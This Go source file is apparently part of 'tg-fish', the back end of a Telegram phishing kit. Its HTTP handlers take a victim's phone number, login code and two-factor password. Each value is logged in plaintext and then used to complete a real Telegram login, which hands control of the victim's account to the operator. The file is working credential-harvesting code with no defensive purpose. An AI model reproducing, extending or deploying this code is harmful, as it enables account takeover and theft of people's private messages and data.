package server

import (
	"log"
	"encoding/json"

	"gamch1k.org/tg-fish/cmd/back-end/internal/telegram"
	"gamch1k.org/tg-fish/cmd/pkg/utils"

	"github.com/gofiber/fiber/v3"
)

func PostPhone(c fiber.Ctx) error {
	c.Accepts("json", "text")
	req := new(utils.UserPhone)

	err := json.Unmarshal(c.Body(), &req)
	utils.ErrorHandler(err)

	log.Println(req.Phone)

	telegram.Login(req.Phone)
	return c.SendString("Phone")
}

func PostCode(c fiber.Ctx) error {
	c.Accepts("json", "text")
	req := new(utils.UserPhoneCode)

	err := json.Unmarshal(c.Body(), &req)
	utils.ErrorHandler(err)

	log.Println(req.Phone)
	log.Println(req.Code)
	
	res := telegram.Code(req.Phone, req.Code)
	if res { return c.SendStatus(200) }
	return c.SendStatus(400)
}

func PostPassword(c fiber.Ctx) error {
	c.Accepts("json", "text")
	req := new(utils.UserPhonePassword)

	err := json.Unmarshal(c.Body(), &req)
	utils.ErrorHandler(err)

	log.Println(req.Phone)
	log.Println(req.Password)
	
	res := telegram.Password(req.Phone, req.Password)
	if res { return c.SendStatus(200) }
	return c.SendStatus(400)
}